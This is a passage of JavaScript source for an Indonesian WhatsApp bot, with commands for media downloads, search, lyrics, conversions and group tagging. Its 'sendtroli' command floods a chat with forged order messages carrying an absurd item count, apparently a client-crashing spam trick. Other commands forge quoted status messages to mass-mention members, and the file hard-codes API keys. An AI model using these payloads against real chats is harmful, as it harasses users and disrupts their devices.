if(!isUrl(args[0]) && !args[0].includes('instagram')) return reply(mess.error.Iv)
teks = args.join(' ')
if (!teks.endsWith('-video') && !teks.endsWith('-foto')) return reply('Ketik -foto / -video Untuk Mengisi Option ')
reply(mess.wait)
if (teks.endsWith('-foto')) {
igl = teks.replace('-foto',"") 
res = await fotoIg(igl).catch(e => {
  reply('_[ ! ] Error Gagal Dalam Masuk Web Atau Link Error_')
})
sendFileFromUrl(res[0].foto, image, {quoted: mek})
}
if (teks.endsWith('-video')) {
igl = teks.replace('-video',"")
res = await videoIg(teks).catch(e => {
  reply('_[ ! ] Error Gagal Dalam Masuk Web Atau Link Error')
})
sendFileFromUrl(res[0].video, video, {mimetype: 'video/mp4', quoted: mek})
}
break
case 'play':
if (args.length < 1) return fakeReply('Error', 0, 'Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
if (!teks.endsWith("+down")){
res = await yts(`${teks}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`Playing ${res.all[0].title}👉😁👈`)
let thumbInfo = `▣╾╼╾╼𝗬𝗼𝘂𝗧𝘂𝗯𝗲╾╼╾╼▣
┣➤ *Title:* ${res.all[0].title}
┣➤ *Channel:* ${res.all[0].author.name}
┣➤ *Channel Link:* ${res.all[0].author.url}
┣➤ *Duration:* ${res.all[0].timestamp}
┣➤ *Views:* ${res.all[0].views}
┣➤ *ID Video:* ${res.all[0].videoId}
┣➤ *Uploaded:* ${res.all[0].ago}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣


*Mengupload File.......*

_*Harap tunggu dan jangan spam⚠️*_
`
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, audio, {quoted: mek, mimetype: 'audio/mp4', ptt: true, filename: res[0].output})
}
if (teks.endsWith("+down")){
const tec = teks.split("+down")
res = await yts(`${tec}`).catch(e => {
reply('_[ ! ] Error Query Yang Anda Masukan Tidak Ada_')
})
reply(`Playing ${res.all[0].title}👉😁👈`)
let thumbInfo = `▣╾╼╾╼𝗬𝗼??𝗧𝘂𝗯𝗲╾╼╾╼▣
┣➤ *Title:* ${res.all[0].title}
┣➤ *Channel:* ${res.all[0].author.name}
┣➤ *Channel Link:* ${res.all[0].author.url}
┣➤ *Duration:* ${res.all[0].timestamp}
┣➤ *Views:* ${res.all[0].views}
┣➤ *ID Video:* ${res.all[0].videoId}
┣➤ *Uploaded:* ${res.all[0].ago}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣


*Mengupload File.......*

_*Harap tunggu dan jangan spam⚠️*_
`
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: thumbInfo})
res = await y2mateA(res.all[0].url).catch(e => {
reply('_[ ! ] Error Saat Memasuki Web Y2mate_')
})
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
}
break 
case 'yts':
case 'ytsearch':
if (args.length < 1) return fakeReply('Error', 0, 'Apa Yang Mau Dicari?')
teks = args.join(' ')
reply(mess.wait)
res = await yts(`${teks}`)
kant = ``
for (let i of res.all) {
kant += `▣╾╼╾╼𝗬𝗼𝘂𝗧𝘂𝗯𝗲╾╼╾╼▣
┣➤ *Title:* ${i.title}
┣➤ *Channel:* ${i.author.name}
┣➤ *Channel Link:* ${i.author.url}
┣➤ *Duration:* ${i.timestamp}
┣➤ *Views:* ${i.views}
┣➤ *ID Video:* ${i.videoId}
┣➤ *Uploaded:* ${i.ago}
┣➤ *Link Video:* ${i.url}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣


`
}
var akhir = kant.trim()
sendFileFromUrl(res.all[0].image, image, {quoted: mek, caption: akhir})
break 
// Add fitur baruu mulu gw pusing 
//Aowkwkwkw
					case 'hidetag':
					if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return fakeReply('Yahahaha', 0, 'Ciee gabisa hidetag') 
					if (args.length < 1) return fakeReply('Kasi Text Goblok, Nanti wa gw crash', 0, 'Error')
					var value = args.join(' ')
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					client.sendMessage(from, options, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'Ingfo Slurdd👉😁👈', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}})
					break 
					case 'stickertag':
       if (!isGroup) return reply(mess.only.group)
       if (!isOwner) return fakeReply('Mau ngapain bang?', 0, 'Hah?') 
       if (!isQuotedSticker) return fakeReply('Error', 0, 'Tag sticker yang ingin di Hidetag')
var stik = await downloadM()
var group = await client.groupMetadata(from)
var mem = group.participants.map(v=> v.jid)
client.sendMessage(from, stik, sticker, {contextInfo: {mentionedJid: mem}, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: `Maap bang ke tag:v`, jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}}) 
break
					case 'hidetag2':
					if (!isGroup) return reply(mess.only.group)
					if (!isfrendsowner) return fakeReply('Yahahaha', 0, 'Ciee gabisa hidetag') 
					if (args.length < 1) return fakeReply('Kasi Text Goblok, Nanti wa gw crash', 0, 'Error')
					var value = args.join(' ')
					var group = await client.groupMetadata(from)
					var member = group['participants']
					var mem = []
					member.map( async adm => {
					mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
					})
					var options = {
					text: value,
					contextInfo: { mentionedJid: mem },
					quoted: mek
					}
					client.sendMessage(from, options, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...('status@broadcast' ? { remoteJid: 'status@broadcast' } : {}) }, message: { imageMessage :{ mimetype: "image/jpeg", caption: 'Ingfo Slurdd👉😁👈', jpegThumbnail: fs.readFileSync('./StevenTs Logo.png'), remoteJid: "status@broadcast"}}}})
					break 
				case 'leave': 
				    if (!isGroup) return reply(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
			    	anu = await client.groupLeave(from, '𝗕𝘆𝗲??', groupId)
	                break
                case 'sendtroli': 
                if (!mek.key.fromMe) return reply('Mau troli ya bang?') 
                watepak = args.join(' ')
                catalogReply(`*Troli sedang disiapkan....*`, 'Loading...')
                 for (i = 0;i < `${watepak}`;i++) {
                 setTimeout ( () => {
         client.sendMessage(from, 'Belanja Slurr', text, {quoted : { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: from} : {}) }, message: { orderMessage:{ orderId: '155157279766079', itemCount: '999999999999999999999999', status: 'INQUIRY', surface:  'CATALOG', message: 'Hangdeh', jpegthumnail: fs.readFileSync('./StevenTs Logo.png'), orderTitle: 'Cuih', sellerJid: '62895357313000@s.whatsapp.net', token: 'AR5wc3iY2NY8yJaK9MMXdlK/aguUxoA8yPtSFcvt0lrE5g==' }}}})
       }, (5000)) 
}
                 
break
                case 'speed':
                    const timestamp = speed();
                    const latensi = speed() - timestamp
                    client.sendMessage(from, `Speed: ${latensi.toFixed(4)} _Second_`, text, { quoted: mek})
                    break
                case 'lirik':
if (args.length < 1) return reply("Apa Yang Mau Di Cari? ")
teks = body.slice(7)
lirikLagu(teks).then((res) => {
let lirik = `*Lirik Lagu :*


${res[0].result}
`
reply(lirik)
})
break
				case 'mp3':
				case 'ytmp3':
if (args.length < 1) return reply('Link Nya Mana?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
teks = args.join(' ')
reply(mess.wait)
res = await y2mateA(teks).catch(e => {
reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate')
})
peleer = `▣╾╼╾╼𝗬𝗼𝘂𝗧𝘂𝗯𝗲╾╼╾╼▣
┣➤ *Judul:* ${res[0].judul}
┣➤ *Quality:* ${res[0].quality}kbps
┣➤ *Size:* ${res[0].size}
┣➤ *Format:* ${res[0].tipe}
┣➤ *File Name:* ${res[0].output}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣


*Mengupload File.......*

_*Harap tunggu dan jangan spam⚠️*_
`
sendFileFromUrl(res[0].thumb, image, {caption: peleer, quoted: mek}).then((lalu) => {
sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
})
break
				case 'mp4':
				case 'ytmp4':
if (args.length < 1) return reply('Link Nya Mana?')
if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply(mess.error.Iv)
teks = args.join(' ')
reply(mess.wait)
res = await y2mateV(teks).catch(e => {
reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
let edeek = `▣╾╼╾╼𝗬𝗼𝘂𝗧𝘂𝗯𝗲╾╼╾╼▣
┣➤ *Judul:* ${res[0].judul}
┣➤ *Quality:* ${res[0].quality}kbps
┣➤ *Size:* ${res[0].size}
┣➤ *Format:* ${res[0].tipe}
┣➤ *File Name:* ${res[0].output}
▣╾╼╾╼╾╼╾╼╾╼╾╼╾╼▣


*Mengupload File.......*

_*Harap tunggu dan jangan spam⚠️*_
`
sendFileFromUrl(res[0].thumb, image, {caption: edeek, quoted: mek}).then((lalu) => {
sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
})
break
			    case 'igstalk': 
if (args.length < 1) return fakeReply('Error', 0, `Pengunaan: ${prefix}igstalk *username*`)
if (budy.includes('@')) return fakeReply('Error', 0, `Tidak perlu memakai "@" pada username❗`) 
semplit = args.join(' ')
res = await axios.get(`https://lindow-api.herokuapp.com/api/igstalk?username=${semplit}&apikey=LindowApi`)
s = (res.data)
skrepen = `Username: ${s.username}
Full Name: ${s.fullName}
Bio: ${s.biography}

Follower: ${s.subscribersCount}
Following: ${s.subscribtions}
Post: ${s.postsCount}
Verified: ${s.isVerified}`

profail = await getBuffer(s.profilePicHD) 

client.sendMessage(from, profail, image, {quoted: mek, caption: `${skrepen}`})
break
				case 'toimg':
					if (!isQuotedSticker) return reply('*Silahkan reply sticker yang mau dijadiin image om*')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('*Gagal, pada saat mengkonversi sticker ke gambar*')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, image, {quoted: mek, caption: '*Nih Puki!*'})
						fs.unlinkSync(ran)
					})
					break
					case 'tomp3':
                	client.updatePresence(from, Presence.composing) 
					if (!isQuotedVideo) return reply('❌ reply videonya um ❌')
					reply(mess.wait)
					encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(encmedia)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
						fs.unlinkSync(media)
						if (err) return reply('❌ Gagal, pada saat mengkonversi video ke mp3 ❌')
						buffer = fs.readFileSync(ran)
						client.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek})
						fs.unlinkSync(ran)
					})
					break 
				case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB) 
					teks = args.join('') 
					prefix = teks
					reply(`*Prefix berhasil di ubah menjadi* : ${prefix}`)
					break 
				case 'setstatus':
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB)
					statz = args[0]
					reply(`*Status berhasil di ubah menjadi* : ${statz}`)
					break
		        //simple aje yekan
				default: 
					if (isSimi && budy != undefined){ 
						if (mek.key.fromMe) return
 res = await axios.get(`https://lindow-api.herokuapp.com/api/simi?text=${budy}&lang=id&apikey=LindowApi`)
 reply(res.data.response.text)
					} else {
						console.log(color('[ERROR]','red'), 'Unregistered Command from', color(sender.split('@')[0]))
					}
                           }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()
